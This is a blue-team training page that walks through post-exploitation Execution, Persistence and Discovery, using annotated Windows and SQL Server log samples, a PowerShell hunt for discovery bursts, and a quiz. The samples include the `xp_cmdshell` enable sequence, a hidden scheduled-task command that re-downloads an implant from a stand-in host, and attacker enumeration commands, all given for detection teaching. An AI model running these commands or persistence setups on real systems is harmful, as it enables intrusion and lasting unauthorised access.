---
title: "Execution, Persistence and Discovery — What the Attacker Does Right After the Exploit"
tags:
  - training
  - blue-team
  - endpoint
  - execution
  - persistence
  - discovery
---

# Execution, Persistence and Discovery — What the Attacker Does Right After the Exploit { #execution-persistence-discovery }

!!! abstract "What this page covers"
    What changes the moment an exploit lands: the attacker now "owns" a process on the box, and everything that follows is **post-exploitation**. How MITRE ATT&CK organises those activities into **tactics, techniques and sub-techniques**, and why SOCs use it as a detection checklist. Then the first three post-exploitation tactics in detail: **Execution** — getting code to run (the payload inside the exploit, a plain shell or a full C2 agent, and breaking out of a restricted interpreter such as SQL Server's `xp_cmdshell`), and why **application control** is so effective against it; **Persistence** — why an attacker might deliberately *not* persist, why most do, and why layered persistence makes half-finished remediation fail (Run keys, scheduled tasks, services, WMI); **Discovery** — the "living off the land" enumeration of users, groups, privileges, files, services, hosts and software, why single-command alerts drown a SOC, and how to detect discovery as a **burst** instead. Every sample (4688, Sysmon 1/13, 4698, 7045, AppLocker 8004, SQL Server 15457, command output) is broken down field by field. Practice questions at the end.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, hashes and file names are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. After a successful exploit the attacker has **code execution inside a process on your host**. From here on, every step is **post-exploitation**, and every step makes clean-up harder and more expensive.
2. **MITRE ATT&CK** lists the attacker's goals as **tactics** (the "why": Execution, Persistence, Discovery…), the ways to reach each goal as **techniques** (the "how": T1053 Scheduled Task/Job), and finer variants as **sub-techniques** (T1053.005 Scheduled Task). Many SOCs use it as the minimum list of behaviours they should be able to detect.
3. **Execution**: the first code usually rides inside the exploit as its **payload**. It typically opens a **command shell** or loads a richer **C2 agent** (Meterpreter-style), which is then used to download and run more tools.
4. Sometimes the attacker lands in an **interpreter, not a shell** — a SQL prompt, an admin web console, a scripting engine. They then use that environment's own features to run OS commands; SQL Server's `xp_cmdshell` is the classic example. Evidence: `sqlservr.exe` → `cmd.exe`.
5. Without execution an attacker can do almost nothing, which is why **application control** is so powerful: every blocked attempt is both a stop and an **early alarm**.
6. **Persistence** is a **trade-off**. It gives reliable access across reboots, log-offs and partial clean-ups, but every Run key, task or service is a change your tools can find. A stealth-first attacker (especially one with a re-usable service-side hole) may skip it.
7. Attackers often **layer** persistence — e.g. a Run key that starts the implant plus a scheduled task that re-downloads it if deleted. Remediation that removes one and misses the other **fails**. Hunt for all of them before declaring a host clean.
8. **Discovery** — who am I, what groups, what privileges, which files, services, hosts and software — is done mostly with **built-in commands** (`whoami`, `net`, `nltest`, `tasklist`, `netstat`, `dir /s`). Each one alone is normal admin noise; a **burst of many different ones from one unusual parent or account** is the signal.

## After the exploit: post-exploitation { #post-exploitation }

### What changes when the exploit lands { #what-changes }

Before the exploit, the attacker is outside knocking on doors. After it, they are **inside a running process** with that process's identity (see [the attacker becomes the process](initial-exploitation.md#becomes-the-process)). Think of a burglar who has just climbed through a window: getting in was one act, but what they do in the next hour — prop a door open for later, look through drawers, find the safe, find the keys to other buildings — is where the real damage happens. Those next-hour activities are **post-exploitation**.

Why does this matter for the SOC? Because the cost of response climbs with every step:

| Stage the attacker reached | What clean-up looks like |
| --- | --- |
| Exploit blocked or caught at first process | Close the hole, verify, done |
| Code ran, no persistence | Isolate, kill process, patch, check for stolen data |
| Persistence installed | Find and remove **every** mechanism, or rebuild the host |
| Credentials stolen, lateral movement | Many hosts, password/ticket resets, possibly domain-wide recovery |

That is why catching **execution** and **persistence** early is worth so much effort.

### ATT&CK: tactics, techniques, sub-techniques { #attack-structure }

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a public knowledge base built from real intrusions. Its structure is simple once you see it:

- **Tactic** = the attacker's short-term **goal** — *why* they do something. Example: **Persistence (TA0003)**.
- **Technique** = a **way** to reach that goal — *how*. Example: **T1053 Scheduled Task/Job**.
- **Sub-technique** = a more **specific variant**. Example: **T1053.005 Scheduled Task** (Windows Task Scheduler), as opposed to T1053.003 Cron on Linux.

The current Enterprise tactics, roughly in the order an intrusion uses them:

| ID | Tactic | One-line meaning |
| --- | --- | --- |
| TA0043 | Reconnaissance | Learn about the target from outside |
| TA0042 | Resource Development | Build infrastructure, accounts, tools |
| TA0001 | Initial Access | Get in |
| TA0002 | **Execution** | Run code |
| TA0003 | **Persistence** | Keep access |
| TA0004 | Privilege Escalation | Get higher rights |
| TA0005 | Stealth | Avoid being noticed (blend in, hide, masquerade) |
| TA0112 | Defense Impairment | Break or blind security tools and logging |
| TA0006 | Credential Access | Steal passwords, hashes, tickets, tokens |
| TA0007 | **Discovery** | Learn the environment from inside |
| TA0008 | Lateral Movement | Move to other systems |
| TA0009 | Collection | Gather the data they want |
| TA0011 | Command and Control | Talk to their infrastructure |
| TA0010 | Exfiltration | Take the data out |
| TA0040 | Impact | Encrypt, destroy, disrupt |

(Older material, and many detection rules, still say **Defense Evasion** for TA0005 — that tactic was split into Stealth and Defense Impairment in 2026; see the 2026 view below.)

Each technique page explains how the behaviour works, which threat groups and malware used it, and how to **mitigate** and **detect** it. That is why many teams treat the matrix as a **coverage checklist**: "for each technique relevant to us, do we have the data and a detection?" In practice you will never cover every cell equally — some techniques are nearly invisible, some are normal admin activity — but as a way to find blind spots and to talk about detections in a shared language it is excellent.

!!! tip "[Supplement] How a SOC actually uses technique IDs"
    - **Tag every detection rule** with its technique ID(s). Then you can draw a heat map of what you cover and what you don't.
    - **Tag alerts and incident timelines** too: "T1059.001 at 07:42, T1547.001 at 07:43, T1087.002 at 07:45" tells the next analyst the story at a glance.
    - **Use it for threat-informed priorities**: if threat reports for your sector keep showing T1053.005 and T1021.002, those are your first detections to build and test.

## Tactic: Execution (TA0002) { #execution }

### The payload rides in with the exploit { #payload }

An exploit is just the trick that makes a program misbehave. On its own it does nothing useful for the attacker — so it carries a **payload**: the first instructions the hijacked process should run. If the exploit works, the payload runs immediately, with the process's identity.

Analogy: the exploit is the crowbar that opens the window; the payload is the burglar climbing through it. A crowbar alone steals nothing.

Typical payloads:

- **A plain command shell** — the hijacked process starts `cmd.exe`, `powershell.exe` or `/bin/sh`, and the attacker types commands over a network connection (a "reverse shell" if the victim connects out to the attacker, a "bind shell" if the victim listens).
- **A full C2 agent ("implant")** — a richer payload like Meterpreter (from the Metasploit framework) or the agents of other C2 frameworks. These offer built-in commands for uploading/downloading files, screenshots, process migration, credential theft and pivoting, often running **entirely in memory** inside the original process.
- **A small "stager"** — just enough code to download and start the real implant (a second stage).

Once the attacker has any of these, they use it as a **foothold**: download more tools, run them, and move on to persistence and discovery. Whether a full shell is possible at all depends on the exploit: some only let the attacker run a single command, or land them in a restricted environment.

Relevant ATT&CK: **T1059 Command and Scripting Interpreter** (`.001` PowerShell, `.003` Windows Command Shell, `.004` Unix Shell), **T1106 Native API**, **T1047 Windows Management Instrumentation**, **T1569.002 Service Execution**, **T1204 User Execution** (for client-side).

### Breaking out of an interpreter: the `xp_cmdshell` case { #xp-cmdshell }

Not every entry gives a shell. Suppose the attacker guesses the `sa` password of a Microsoft SQL Server, or exploits a SQL injection in a web app. They are now at a **SQL prompt** — they can query tables, but they can't type `whoami`. So they look for a feature of the **environment itself** that runs OS commands.

SQL Server has exactly such a feature: the extended stored procedure **`xp_cmdshell`**. It takes a string, starts a Windows command shell, passes the string to it, and returns the output as rows. It is **disabled by default** (since SQL Server 2005), but anyone with `sysadmin` rights can switch it on. What a defender would see an attacker type at the SQL prompt:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

- Line 1 — `sp_configure 'show advanced options', 1` makes advanced settings visible; `RECONFIGURE` applies it. Needed because `xp_cmdshell` is an "advanced" option.
- Line 2 — switches `xp_cmdshell` from 0 (off) to 1 (on) and applies it.
- Line 3 — runs `whoami` in a real Windows shell. The result comes back as a one-column table:

```
output
-----------------------------
nt service\mssqlserver
NULL
```

`nt service\mssqlserver` is the SQL Server **service identity** — that's who the attacker now is on the OS (the trailing `NULL` row is normal). If the service ran as `LocalSystem` or a domain admin account (it happens), this one line would be a full compromise.

Analogy: a hotel guest can't enter the kitchen, but room service will cook whatever you write on the order card. `xp_cmdshell` is room service for the operating system.

**Where it shows up in logs:**

1. **SQL Server's own messages.** Changing the option writes event **15457** to the Windows **Application** log (source `MSSQLSERVER`), and the same line goes to the SQL Server `ERRORLOG`:

    ```
    Log Name:   Application
    Source:     MSSQLSERVER
    Event ID:   15457
    Computer:   SRV-SQL-0004.corp.example
    Message:    Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
    ```

    - `Event ID 15457` — "a server configuration option was changed". Fires for any `sp_configure` change; it's rare in production, so **any 15457 naming `xp_cmdshell` deserves a look**.
    - `changed from 0 to 1` — it was off and is now on. Attackers often switch it back to 0 afterwards; you'd then see a second 15457 "from 1 to 0" minutes later — a strong sign of deliberate use.

2. **Process creation** — the decisive evidence, 4688 on the SQL server:

    ```
    EventID:            4688
    Computer:           SRV-SQL-0004.corp.example
    NewProcessName:     C:\Windows\System32\cmd.exe
    CommandLine:        "cmd.exe" /c whoami
    ParentProcessName:  C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
    TargetUserName:     MSSQLSERVER
    TargetDomainName:   NT SERVICE
    ```

    - `ParentProcessName … sqlservr.exe` — the database engine started a shell. Like `w3wp.exe` → `cmd.exe`, a **database engine spawning a shell is almost never legitimate** (some old maintenance jobs do it; baseline them and alert on the rest).
    - `CommandLine "cmd.exe" /c whoami` — `xp_cmdshell` always wraps the string in `cmd.exe /c`, so this shape is characteristic.
    - `TargetUserName/TargetDomainName NT SERVICE\MSSQLSERVER` — the identity the shell runs as: what was compromised.

The same idea applies elsewhere: a web admin console with a "run diagnostic" box, a CI/CD server's build script, a monitoring tool's "custom check", a router's debug shell. **Any feature that runs commands is an execution path.** ATT&CK covers many of these under T1059 and, for SQL stored procedures used to keep access, **T1505.001 SQL Stored Procedures** (Persistence).

### Why application control is so effective { #app-control }

Execution is the bottleneck of the whole attack: no tool runs, no credentials get dumped, nothing gets encrypted. **Application control** (allow-listing) means only approved programs and scripts may run — by publisher signature, path or hash. Windows offers **AppLocker** and **App Control for Business** (formerly WDAC); Linux has tools such as `fapolicyd`.

It helps twice:

- **Prevention** — the attacker's dropped `svc_update.exe` in `C:\Users\Public\` simply doesn't start.
- **Detection** — the block is logged. Legitimate users rarely trip a well-tuned policy, so a block on a server or an admin's machine is a **high-signal early alarm**, often the first sign of an intrusion.

An AppLocker block, from the log `Microsoft-Windows-AppLocker/EXE and DLL`:

```
Event ID:  8004
Level:     Error
Computer:  LT-FIN-0117.corp.example
User:      CORP\p.nguyen
Message:   %OSDRIVE%\USERS\PUBLIC\SVC_UPDATE.EXE was prevented from running.
PolicyName: EXE
RuleName:  -
FilePath:  %OSDRIVE%\USERS\PUBLIC\SVC_UPDATE.EXE
FileHash:  9C2E…77A1
Fqbn:      -
```

- `Event ID 8004` — **blocked** (enforced). `8003` is the same in **audit-only** mode ("would have been prevented"); `8002` means allowed. Attackers care because 8004 means their tool failed *and* they were seen.
- `User` — who tried to run it. A finance user launching an EXE from `C:\Users\Public` is not normal.
- `FilePath` — `C:\Users\Public` is world-writable — a favourite drop location.
- `Fqbn: -` — "fully qualified binary name" is empty: the file is **not signed** by any publisher.
- `FileHash` — pivot into EDR or threat intelligence to see if the file exists elsewhere.

App Control for Business writes the equivalent events to `Microsoft-Windows-CodeIntegrity/Operational` (**3077** = blocked, **3076** = audit). The endpoint-defence section covers application control and its bypasses in detail.

## Tactic: Persistence (TA0003) { #persistence }

### To persist or not to persist { #persist-or-not }

Persistence means making sure access **survives**: a reboot, the user logging off, the exploited process crashing, the antivirus deleting one file. It isn't automatic — it's a **choice** with a cost.

Analogy: a burglar who wants to come back can hide a spare key under the doormat and copy the alarm code. That makes the next visit easy — but a spare key is something a careful home-owner can find, and finding it tells them they were burgled.

| Reasons to persist | Reasons not to |
| --- | --- |
| Long campaigns need access over weeks or months | Every persistence mechanism is a **change** that tools can detect |
| Re-exploiting is risky (more noise) and may stop working (patched, user won't click again) | If the original hole stays open (service-side), they can just come back |
| Survive reboots, log-offs, password changes | Stealth is the top priority for some missions |
| Survive **partial** clean-up (AV removes one file) | Short "smash and grab" operations (e.g. quick data theft) don't need it |

So, connecting to the previous page: attackers who came in **client-side** (needing a user to click) are **more likely** to persist quickly, while attackers with a repeatable **service-side** hole may skip it.

### Layered persistence and failed remediation { #layered }

A careful attacker rarely relies on one mechanism. A realistic setup on `LT-FIN-0117`:

1. A **Run key** starts the implant every time the user logs on.
2. A **scheduled task** runs every hour, checks whether the implant file still exists, and **re-downloads it** if not.
3. Optionally, a **WMI event subscription** or a **service** as a third copy.

Now the SOC finds the implant via an AV alert, deletes the file and the Run key, and closes the ticket. An hour later the scheduled task fetches a fresh copy. **Remediation failed** — and worse, the attacker now knows they were noticed. The lesson: when you find one persistence mechanism, **assume there are others** and sweep for all common types, or rebuild the host.

The common Windows mechanisms and their evidence:

| Mechanism | ATT&CK | Where it lives | Best evidence |
| --- | --- | --- | --- |
| Run / RunOnce keys | T1547.001 | `HKCU\…\CurrentVersion\Run`, `HKLM\…\Run` | Sysmon 13 (registry value set), EDR, autoruns sweep |
| Startup folder | T1547.001 | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | Sysmon 11 (file create) |
| Scheduled task | T1053.005 | `C:\Windows\System32\Tasks\`, registry `TaskCache` | **4698** (task created), Task Scheduler Operational 106 |
| New service | T1543.003 | `HKLM\SYSTEM\CurrentControlSet\Services` | **7045** (System log), **4697** (Security log) |
| WMI event subscription | T1546.003 | WMI repository | Sysmon 19/20/21, WMI-Activity Operational 5861 |
| New local/domain account | T1136 | SAM / AD | 4720 (user created), 4732/4728 (added to group) |
| Linux: cron, systemd unit, `authorized_keys` | T1053.003, T1543.002, T1098.004 | `/etc/cron*`, `/etc/systemd/system/`, `~/.ssh/` | auditd file watches, FIM |

Let's read the three most common records.

### Evidence 1: a Run key (Sysmon 13) { #run-key }

```
Event ID: 13   Registry value set
UtcTime:      2026-11-19 07:43:05.118
ProcessId:    9020
Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
EventType:    SetValue
TargetObject: HKU\S-1-5-21-1111111111-2222222222-3333333333-1604\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync
Details:      C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe
User:         CORP\p.nguyen
```

- `Event ID 13` — Sysmon "registry value set": a value was written (needs a Sysmon config that watches Run keys; most good configs do).
- `Image … powershell.exe` — **PowerShell** wrote it. Real installers are usually `msiexec.exe` or the product's own setup program; a script host writing a Run key is suspicious.
- `TargetObject` — `HKU\<SID>\…\Run\OneDriveSync`: the current user's Run key, value name `OneDriveSync`. The name **imitates** a real product — a masquerading trick.
- `Details` — the program that will start at every log-on: an EXE in **`AppData\Roaming`**, not in Program Files where the real OneDrive lives.
- `ProcessId 9020` — pivot to that process's creation event to see who started PowerShell (often Office or a downloaded file, as on the previous page).

To check a host directly:

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    MicrosoftEdgeAutoLaunch    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window
    OneDriveSync    REG_SZ    C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe
```

- `reg query "<key>"` — list every value under that key.
- Each line is `name  type  data`. `REG_SZ` = a text value. The first entry is a normal Edge start-up item; the second is the attacker's.

### Evidence 2: a scheduled task (4698) { #task }

Event **4698 — "A scheduled task was created"** — is written to the Security log when **Audit Other Object Access Events** is enabled. Attackers love scheduled tasks because they can run as SYSTEM, on a timer, at boot or at log-on, and look like normal maintenance. The event includes the **full task XML**, which is gold:

```
EventID:          4698
Computer:         LT-FIN-0117.corp.example
SubjectUserName:  p.nguyen
SubjectDomainName: CORP
TaskName:         \Microsoft\Windows\Maintenance\SyncHealth
TaskContent:
  <Task>
    <Triggers>
      <TimeTrigger>
        <Repetition><Interval>PT1H</Interval></Repetition>
        <StartBoundary>2026-11-19T07:44:00</StartBoundary>
      </TimeTrigger>
    </Triggers>
    <Principals><Principal><UserId>CORP\p.nguyen</UserId></Principal></Principals>
    <Settings><Hidden>true</Hidden></Settings>
    <Actions>
      <Exec>
        <Command>powershell.exe</Command>
        <Arguments>-w hidden -c "if(!(Test-Path $env:APPDATA\OneDriveSync\odsync.exe)){iwr https://cdn.sync-health.example/o.bin -OutFile $env:APPDATA\OneDriveSync\odsync.exe}"</Arguments>
      </Exec>
    </Actions>
  </Task>
```

- `SubjectUserName p.nguyen` — who created the task. A normal user creating a task under `\Microsoft\Windows\…` is odd; that folder is where Windows' **own** tasks live, so the attacker is hiding among them.
- `TaskName …\Maintenance\SyncHealth` — a name designed to look boring.
- `TimeTrigger` + `Repetition Interval PT1H` — run **every hour** (`PT1H` is ISO 8601 for "period of 1 hour").
- `Principal UserId` — it runs as `p.nguyen` (if it said `S-1-5-18`, it would run as SYSTEM).
- `Hidden true` — hidden from the default Task Scheduler view.
- `Actions/Exec` — the payload: hidden PowerShell that **checks whether `odsync.exe` exists, and if not, downloads it again**. This is exactly the "re-download if deleted" layer.

### Evidence 3: a new service (7045 / 4697) { #service }

Event **7045 — "A service was installed in the system"** — lands in the **System** log, logged by the Service Control Manager; **4697** is the Security-log equivalent (needs Audit Security System Extension). Services start at boot, usually as **SYSTEM**, so they're both persistence and privilege.

```
Log Name:     System
Source:       Service Control Manager
Event ID:     7045
Computer:     SRV-FILE-0003.corp.example
Service Name: Windows Telemetry Helper
Service File Name: C:\ProgramData\WinTel\wtelhlp.exe -k netsvcs
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem
```

- `Service Name` — a reassuring, Microsoft-sounding name.
- `Service File Name` — the binary in **`C:\ProgramData`**, a writable folder, with `-k netsvcs` tacked on to look like a `svchost.exe` service. Real Windows services live in `System32`.
- `auto start` — starts at every boot.
- `LocalSystem` — runs with the highest local privilege.

The [persistence reference](../../../adversary/persistence.md) collects more mechanisms; the important-events section later in these notes covers 4698 and 7045 in depth.

## Tactic: Discovery (TA0007) { #discovery }

### Why attackers need it { #discovery-why }

After the exploit the attacker usually knows very little: an IP, a hostname, an account. To reach their goal (data, domain admin, a specific system) they must **map the place** from the inside. Picture a burglar in a dark office building: they read the floor plan by the lift, the names on the doors, the organisation chart on the wall, and which doors have card readers. Discovery is exactly that, done with commands.

What they look for, the built-in tools they use, and the ATT&CK technique:

| Question | Typical built-in commands | ATT&CK |
| --- | --- | --- |
| Who am I, what privileges? | `whoami /all`, `id` | T1033 System Owner/User Discovery |
| Which accounts exist? | `net user`, `net user /domain`, `Get-ADUser` | T1087 Account Discovery (`.001` local, `.002` domain) |
| Which groups, who are the admins? | `net localgroup administrators`, `net group "Domain Admins" /domain` | T1069 Permission Groups Discovery |
| What is this machine? | `systeminfo`, `hostname`, `uname -a` | T1082 System Information Discovery |
| Network config, domain controllers | `ipconfig /all`, `route print`, `nltest /dclist:` | T1016 System Network Configuration Discovery |
| Domain trusts | `nltest /domain_trusts` | T1482 Domain Trust Discovery |
| Running processes / security tools | `tasklist /v`, `ps aux` | T1057 Process Discovery, T1518.001 Security Software Discovery |
| Connections and listening services | `netstat -ano`, `ss -tunap` | T1049 System Network Connections Discovery |
| Services | `sc query`, `systemctl list-units` | T1007 System Service Discovery |
| Files and folders | `dir /s /b *.xlsx`, `tree`, `find / -name "*.kdbx"` | T1083 File and Directory Discovery |
| Shares | `net view \\SRV-FILE-0003`, `net share` | T1135 Network Share Discovery |
| Other hosts | `net view`, `arp -a`, ping sweeps | T1018 Remote System Discovery |
| Installed software | `wmic product get name` (deprecated), registry Uninstall keys | T1518 Software Discovery |

### Living off the land — why it's hard to catch { #lotl }

Using what's already on the box is called **living off the land**. Attackers like it because:

- **Nothing new is dropped** — no file for antivirus to scan; the binaries are signed by Microsoft.
- **It blends in** — admins, help-desk scripts, inventory agents and installers run `whoami`, `ipconfig`, `net`, `tasklist` all day.
- **Alerting on each command would flood the SOC.** A rule "alert on `whoami`" on 5,000 machines produces thousands of false positives a day and gets switched off. So in many environments discovery goes completely unhindered.

To show what an attacker learns, here is one command and its output:

```
C:\> net group "Domain Admins" /domain
The request will be processed at a domain controller for domain corp.example.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            adm.lee                  svc_backup
The command completed successfully.
```

- `net group "<name>" /domain` — ask a **domain controller** for the members of a domain group.
- `Members` — the attacker now knows the three accounts worth stealing. Note `svc_backup`: a **service account in Domain Admins** is a classic weak point (its password is often old and stored in scripts). Their next steps (credential access, lateral movement) target exactly these names.

### Detecting discovery: look for the burst { #discovery-detect }

Since single commands are noise, detect the **pattern**: many *different* discovery commands, from **one parent process or one account**, within **a few minutes**. Here is what 4688 (or Sysmon 1) shows on `LT-FIN-0117` after the implant starts:

```
07:45:02  CORP\p.nguyen  parent=odsync.exe  whoami.exe /all
07:45:04  CORP\p.nguyen  parent=odsync.exe  ipconfig.exe /all
07:45:07  CORP\p.nguyen  parent=odsync.exe  net.exe user p.nguyen /domain
07:45:11  CORP\p.nguyen  parent=odsync.exe  net.exe group "Domain Admins" /domain
07:45:15  CORP\p.nguyen  parent=odsync.exe  nltest.exe /dclist:corp.example
07:45:19  CORP\p.nguyen  parent=odsync.exe  nltest.exe /domain_trusts
07:45:26  CORP\p.nguyen  parent=odsync.exe  tasklist.exe /v
07:45:31  CORP\p.nguyen  parent=odsync.exe  netstat.exe -ano
07:45:40  CORP\p.nguyen  parent=odsync.exe  cmd.exe /c dir /s /b \\SRV-FILE-0003\finance\*.xlsx
```

Reading it as an analyst:

- **Nine different discovery commands in 38 seconds** — no human types that fast and that systematically; it's a script or an operator working from a checklist.
- **Same parent: `odsync.exe`** — an unknown program in `AppData` (the one from the Run key above) is running admin commands. Legitimate admin tools have known parents (`explorer.exe` for a person at a prompt, or a known management agent).
- **Same user, a finance user** — finance staff don't normally run `nltest /domain_trusts`.
- **The order tells the story**: who am I → what network → what's my account → who are the admins → where are the DCs → what trusts → what security software is running → what connections → where are the spreadsheets. That's T1033 → T1016 → T1087.002 → T1069.002 → T1018/T1482 → T1057/T1518.001 → T1049 → T1083/T1135.

A simple PowerShell hunt for this pattern over the Security log of one host:

```powershell
$disc = 'whoami.exe','net.exe','net1.exe','nltest.exe','ipconfig.exe','systeminfo.exe','tasklist.exe','netstat.exe','quser.exe','arp.exe'
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-24)} |
  ForEach-Object { $x=[xml]$_.ToXml(); $d=@{}; $x.Event.EventData.Data | % { $d[$_.Name]=$_.'#text' }
    [pscustomobject]@{Time=$_.TimeCreated; Parent=$d.ParentProcessName; Child=Split-Path $d.NewProcessName -Leaf} } |
  Where-Object { $disc -contains $_.Child } |
  Group-Object Parent | Where-Object { ($_.Group.Child | Sort-Object -Unique).Count -ge 4 } |
  Select-Object Count, Name, @{n='Commands';e={($_.Group.Child | Sort-Object -Unique) -join ','}}
```

Line by line:

1. `$disc = …` — the list of common discovery binaries to watch (`net1.exe` is what `net.exe` actually calls for some subcommands).
2. `Get-WinEvent -FilterHashtable @{…}` — read only Security-log events with ID 4688 from the last 24 hours (the hashtable filter is fast because Windows filters before PowerShell sees the events).
3. `ForEach-Object { $x=[xml]$_.ToXml() … }` — turn each event into XML and copy its `EventData` fields into a hashtable `$d`, so we can use names like `$d.ParentProcessName`.
4. `[pscustomobject]@{…}` — keep just the time, the parent path and the child's file name (`Split-Path -Leaf` cuts `C:\Windows\System32\` off).
5. `Where-Object { $disc -contains $_.Child }` — keep only discovery binaries.
6. `Group-Object Parent` — bucket them by parent process; `Where-Object { … -ge 4 }` keeps parents that ran **at least four different** discovery tools.
7. `Select-Object …` — print the count, the parent and the list of distinct tools.

Output:

```
Count Name                                                     Commands
----- ----                                                     --------
   14 C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe arp.exe,ipconfig.exe,net.exe,netstat.exe,nltest.exe,tasklist.exe,whoami.exe
    6 C:\Program Files\InventoryAgent\invagent.exe             ipconfig.exe,systeminfo.exe,netstat.exe,whoami.exe
```

The second row is a known inventory agent — baseline it (add to an exclusion list after confirming). The first row is the intrusion. In a SIEM you would build the same logic across all hosts: **distinct count of discovery commands per parent (or per user) per host in a short window, above a threshold, excluding known tools**.

!!! tip "[Supplement] Other discovery signals worth having"
    - **Domain-wide queries from a workstation**: `net group … /domain`, `nltest /dclist`, `nltest /domain_trusts` are rare from ordinary user machines.
    - **AD enumeration tools** (BloodHound collectors, AdFind, PowerView-style scripts) make a burst of **LDAP queries** to domain controllers; EDR on the DC, LDAP query logging, or a honeytoken account that "nobody should ever look up" can catch them.
    - **Service accounts doing interactive things** — a SQL or web service identity running `net user /domain` is almost never legitimate.
    - **Linux**: `id; uname -a; cat /etc/passwd; sudo -l; ps aux; ss -tunap` in quick succession from a web server user (`www-data`) — see the auditd and process-creation pages later.

## Putting it together: the first five minutes { #timeline }

| Time | What happened | Tactic / technique | Evidence |
| --- | --- | --- | --- |
| 07:41:58 | Word opens a macro document, starts hidden PowerShell | Execution, T1204.002 → T1059.001 | Sysmon 1, 4688, 4104 |
| 07:42:30 | PowerShell downloads `odsync.exe` into `AppData\Roaming` | Command and Control, T1105 | Sysmon 3, Sysmon 11, proxy log |
| 07:43:05 | Run key `OneDriveSync` created | Persistence, T1547.001 | Sysmon 13 |
| 07:43:50 | Hourly hidden task created that re-downloads the implant | Persistence, T1053.005 | 4698 |
| 07:45:02–40 | Nine discovery commands from `odsync.exe` | Discovery, T1033/T1087/T1069/T1482/T1083… | 4688 / Sysmon 1 burst |

Five minutes, three tactics, and every step left a record — if the logging is on. The defensive point: **an alert at 07:41 (Office → PowerShell) or 07:43 (script host writes a Run key) is far cheaper than an alert at 07:45** — and much cheaper than finding this a month later.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The ideas on this page are unchanged and central to modern detection: ATT&CK is still the common language of SOCs and detection vendors, and "tag every rule with technique IDs" is standard practice. Execution through shells, script hosts and environment features like `xp_cmdshell` is still everyday attacker behaviour, and database engines spawning shells remain a reliable detection. Persistence is still a trade-off, layered persistence still defeats partial clean-up, and Run keys, scheduled tasks and services are still the most common Windows mechanisms. Discovery is still dominated by built-in commands, and burst/sequence detection is how EDR and SIEM content catches it.

!!! info "[Changed] What has changed"
    - **ATT&CK restructured.** In **v19 (April 2026)** the old *Defense Evasion* tactic was **split**: **Stealth** keeps the ID **TA0005** (blending in, masquerading, obfuscation, LOLBins) and the new **Defense Impairment (TA0112)** covers breaking security tools and logging. The old **T1562 Impair Defenses** technique was revoked and its sub-techniques reissued under new IDs (e.g. **T1685 Disable or Modify Tools**). v18 (late 2025) had already replaced data sources with **detection strategies and analytics**, and **v20 (October 2026)** continued adding content (including AI-related abuse). The Execution, Persistence and Discovery techniques used on this page were not renumbered in v19.
    - **C2 beyond Meterpreter.** Meterpreter is still around, but real intrusions more often use other C2 frameworks (commercial ones like Cobalt Strike, open-source ones like Sliver and Havoc) — or skip custom implants and use **legitimate remote-management (RMM) tools** such as remote-support agents as both execution and persistence (ATT&CK T1219 Remote Access Tools). Signed, legitimate software is harder to block and to flag.
    - **Persistence moved into identity and cloud too.** In hybrid environments attackers persist by adding **MFA methods, OAuth app consents, app-registration credentials, mailbox forwarding rules** or federation trusts — none of which touches a Windows host. Your persistence hunt must include identity-provider audit logs.
    - **Speed.** Ransomware operators now often run their whole discovery checklist (and AD collection) within minutes of access, so discovery detections need to fire in near real time.

!!! warning "[Caution] Where the old way is wrong or risky today"
    - **Don't alert on single discovery commands.** It floods the queue and the rule gets disabled; detect bursts, unusual parents and unusual accounts instead.
    - **Don't close an incident after removing one persistence mechanism.** Sweep for all common types (Run keys, Startup folder, tasks, services, WMI, accounts, RMM tools, identity-side persistence), or rebuild.
    - **Check your rule mappings.** Rules and dashboards still tagged "Defense Evasion" or T1562 need remapping to Stealth / Defense Impairment and the new technique IDs, or your coverage reports will be wrong.
    - **Never enable `xp_cmdshell` "temporarily" for a job and forget it**, and don't run SQL Server as LocalSystem or a domain admin. Alert on event 15457 for `xp_cmdshell` and on `sqlservr.exe` spawning shells.
    - **Audit mode isn't protection.** Many organisations leave application control in audit-only (8003/3076) for years. Audit events are useful telemetry, but they stop nothing.

## Practice questions { #quiz }

### Question 1

On `SRV-SQL-0004` you see, two minutes apart: an Application-log event 15457 "Configuration option 'xp_cmdshell' changed from 0 to 1", then a 4688 with `ParentProcessName = …\sqlservr.exe`, `CommandLine = "cmd.exe" /c net user /domain`, `TargetUserName = svc_sql`, `TargetDomainName = CORP`. Ten minutes later, another 15457 "from 1 to 0". What happened, which tactics are involved, and why does the account matter?

??? success "Answer and explanation"
    Someone with `sysadmin` rights on the SQL Server (stolen `sa` password, SQL injection as a privileged login, or a compromised DBA account) **switched on `xp_cmdshell`**, used it to **break out of the SQL interpreter** into a real Windows shell (**Execution**, T1059.003 via SQL Server), ran **`net user /domain`** to list domain accounts (**Discovery**, T1087.002), and then **switched it back off** to hide the change. The on → use → off sequence is a strong sign of deliberate, hands-on-keyboard abuse, not a forgotten maintenance job.

